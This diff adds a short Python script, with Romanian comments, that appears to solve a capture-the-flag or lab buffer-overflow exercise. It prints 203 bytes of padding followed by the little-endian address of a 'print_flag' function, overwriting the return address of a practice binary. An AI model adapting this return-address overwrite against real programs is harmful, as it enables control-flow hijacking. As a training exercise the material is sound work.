@@ -1,0 +1,11 @@
+#!/usr/bin/env python3
+
+import sys
+
+offset = 203
+padding = offset * b"C"
+# adresa lui print_flag
+new_call_address = b"\x91\x92\x04\x08"
+# pentru ca am python3 si diferenta bytes strings
+# a trebuit sa folosesc pachetul sys pentru a afisa hexa
+sys.stdout.buffer.write(padding + new_call_address)
